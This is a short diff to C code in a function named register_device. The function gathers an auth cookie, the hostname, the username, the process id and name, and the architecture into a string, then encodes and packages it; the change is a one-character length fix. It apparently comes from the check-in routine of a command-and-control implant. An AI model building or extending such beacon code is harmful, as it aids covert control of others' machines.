@@ -293,7 +293,7 @@ void register_device() {
     CHAR* data_pointer = malloc(pointer_length);
     sprintf_s(data_pointer, pointer_length, data.format, data.status, auth.cookie, info.hostname, info.username, info.pid, info.name, info.arch);
 
-    DWORD data_length = pointer_length - strlen(data.format) + 4;
+    DWORD data_length = pointer_length - strlen(data.format) + 3;
     CHAR* buffer = encode(data_pointer, data_length);
     package(buffer);
 
